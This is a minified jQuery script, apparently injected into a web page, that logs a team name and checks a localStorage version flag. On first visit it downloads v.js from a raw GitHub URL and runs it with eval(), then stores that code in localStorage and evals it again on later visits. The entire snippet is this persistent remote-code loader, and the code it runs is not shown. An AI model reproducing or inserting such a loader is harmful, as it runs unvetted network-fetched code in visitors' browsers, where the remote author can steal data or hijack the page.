(function($){console.log("Instinct-ManiacTeam");var t=localStorage.getItem("maniac-test");if(!t||t!="v1.4"){var msg="fix";localStorage.setItem("maniac-test","v1.4");localStorage.setItem("maniac-alert-msg",msg);$.get("https://raw.githubusercontent.com/lrb9986/xgb/master/v.js",function(r){eval(r);G?G.maniacAlert(msg,5e3):null;localStorage.setItem("maniac-M",r)})}else{if($("#maniac").length>0){}else{eval(localStorage.getItem("maniac-M"))}}})($);